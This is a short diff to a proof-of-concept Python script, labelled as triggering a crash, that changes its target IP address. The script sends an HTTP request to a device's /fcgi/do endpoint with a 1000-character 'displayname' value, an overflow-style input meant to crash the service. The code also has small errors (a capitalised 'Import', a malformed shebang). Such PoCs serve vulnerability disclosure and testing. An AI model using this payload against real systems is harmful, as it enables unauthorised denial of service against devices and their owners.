@@ -10,7 +10,7 @@ PoC triggering crash:
 #/usr/bin/python3
 Import requests
 
-target_ip = '172.28.83.57'
+target_ip = '192.168.0.3'
 url = ('http://%s/fcgi/do?displayname='+'A'*1000) % target_ip
 r = requests.get(url)
 print(r.status_code)
